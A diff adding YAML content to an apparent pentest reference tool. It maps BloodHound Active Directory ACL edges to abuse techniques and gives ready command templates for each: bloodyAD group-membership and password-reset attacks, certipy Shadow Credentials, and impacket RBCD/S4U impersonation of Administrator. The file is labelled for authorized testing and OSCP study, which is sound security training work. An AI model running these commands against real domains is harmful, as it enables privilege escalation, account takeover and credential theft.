@@ -1,0 +1,142 @@
+# Cephalo content — AD ACL abuse + delegation (weaponizes BloodHound edges).
+# Authorized testing only. These are the techniques the BloodHound edge→abuse table
+# links to via abuseTechniqueId (no command duplication).
+sections:
+  - id: ad.p10.acl
+    title: AD ACL Abuse & Delegation
+    os: ad
+    phase: lateral-movement
+    order: 125
+    description: Turn dangerous ACL edges (BloodHound) into access — ACLs, RBCD, Shadow Credentials.
+    techniques: [ad.acl.addmember, ad.acl.forcechangepw, ad.acl.shadowcred, ad.acl.rbcd]
+    packs: [oscp]
+
+techniques:
+  - id: ad.acl.addmember
+    title: GenericWrite/AddMember → group control
+    os: [ad]
+    phase: lateral-movement
+    summary: Add a controlled principal to a privileged group via a writable ACL.
+    body: |
+      A GenericAll/GenericWrite/AddMember edge over a group lets you add yourself
+      (or a controlled user) to it — instantly inheriting its rights.
+    commands: [ad.acl.addmember.bloodyad]
+    tags: [acl-abuse, lateral-movement]
+    archetypeBand: high
+    references: [ref.bloodyad, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.acl.forcechangepw
+    title: ForceChangePassword → reset
+    os: [ad]
+    phase: lateral-movement
+    summary: Reset a target user's password without knowing the old one.
+    commands: [ad.acl.forcechangepw.bloodyad]
+    tags: [acl-abuse, lateral-movement]
+    archetypeBand: high
+    references: [ref.bloodyad]
+    confidence: verified
+    packs: [oscp]
+
+  - id: ad.acl.shadowcred
+    title: AddKeyCredentialLink → Shadow Credentials
+    os: [ad]
+    phase: credential-access
+    summary: Write a key credential, then PKINIT for the target's NT hash/TGT.
+    body: |
+      With write access to msDS-KeyCredentialLink, add a device key and PKINIT to
+      recover the target's hash. ADCS/PKINIT prerequisites are environment-specific.
+    commands: [ad.acl.shadowcred.certipy]
+    tags: [acl-abuse, credential-access]
+    archetypeBand: high
+    references: [ref.certipy]
+    confidence: unverified
+    packs: [oscp]
+
+  - id: ad.acl.rbcd
+    title: Resource-Based Constrained Delegation (RBCD)
+    os: [ad]
+    phase: lateral-movement
+    summary: Write RBCD to a controlled computer, then S4U to impersonate any user.
+    body: |
+      Writing msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer to a
+      controlled machine account lets you S4U2Self/Proxy and impersonate any user
+      (e.g. Administrator) to that host's services.
+    commands: [ad.acl.rbcd.write, ad.acl.rbcd.s4u]
+    tags: [rbcd, lateral-movement]
+    archetypeBand: high
+    references: [ref.impacket, ref.adsecurity]
+    confidence: verified
+    packs: [oscp]
+
+commands:
+  - id: ad.acl.addmember.bloodyad
+    title: Add to group (bloodyAD)
+    template: "bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u '{{USER}}' -p '{{PASS}}' add groupMember '{{GROUP}}' '{{TARGET_USER}}'"
+    tool: bloodyAD
+    description: Add TARGET_USER to GROUP using a writable ACL.
+    os: [ad]
+    phase: lateral-movement
+    tags: [acl-abuse]
+    confidence: verified
+    references: [ref.bloodyad]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.acl.forcechangepw.bloodyad
+    title: Reset password (bloodyAD)
+    template: "bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u '{{USER}}' -p '{{PASS}}' set password '{{TARGET_USER}}' 'Cephalo-Lab-Pw1!'"
+    tool: bloodyAD
+    description: Force-change TARGET_USER's password (the new value is yours to choose).
+    os: [ad]
+    phase: lateral-movement
+    tags: [acl-abuse]
+    notes:
+      - "Changing a user's password may break their logon — note it and restore if required by the engagement."
+    confidence: verified
+    references: [ref.bloodyad]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.acl.shadowcred.certipy
+    title: Shadow Credentials (certipy)
+    template: "certipy shadow auto -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -account '{{TARGET_USER}}' -dc-ip {{DC_IP}}"
+    tool: certipy
+    description: Add a key credential and PKINIT to recover the target's NT hash.
+    os: [ad]
+    phase: credential-access
+    tags: [acl-abuse]
+    notes:
+      - "Requires a reachable, PKINIT-capable ADCS — confirm prerequisites first."
+    confidence: unverified
+    references: [ref.certipy]
+    danger: high
+    packs: [oscp]
+
+  - id: ad.acl.rbcd.write
+    title: Configure RBCD (impacket-rbcd)
+    template: "impacket-rbcd -delegate-from '{{COMPUTER}}' -delegate-to '{{TARGET_USER}}' -action write '{{DOMAIN}}/{{USER}}:{{PASS}}' -dc-ip {{DC_IP}}"
+    tool: impacket
+    description: Write msDS-AllowedToActOnBehalfOfOtherIdentity to a controlled account.
+    os: [ad]
+    phase: lateral-movement
+    tags: [rbcd, acl-abuse]
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
+  - id: ad.acl.rbcd.s4u
+    title: S4U impersonation (getST)
+    template: "impacket-getST -spn 'cifs/{{TARGET}}' -impersonate Administrator -dc-ip {{DC_IP}} '{{DOMAIN}}/{{COMPUTER}}'"
+    tool: impacket
+    description: Request a service ticket as Administrator to the target via S4U.
+    os: [ad]
+    phase: lateral-movement
+    tags: [rbcd, pass-the-ticket]
+    notes:
+      - "Set KRB5CCNAME to the generated ticket, then use -k -no-pass on the lateral card."
+    confidence: verified
+    references: [ref.impacket]
+    danger: high
+    packs: [oscp]
